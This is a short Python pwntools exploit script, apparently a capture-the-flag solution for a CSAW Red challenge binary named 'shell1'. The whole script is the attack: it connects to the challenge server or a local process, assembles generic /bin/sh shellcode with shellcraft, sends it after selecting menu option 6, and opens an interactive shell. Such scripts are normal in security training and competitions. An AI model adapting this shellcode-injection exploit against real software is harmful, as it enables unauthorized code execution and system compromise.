from pwn import *

e = ELF("./shell1")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.red.csaw.io", 5000)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

pay = asm(shellcraft.sh())
print(len(pay))

p.sendlineafter(">", "6")
p.sendlineafter(">", pay)

debug()

p.interactive()
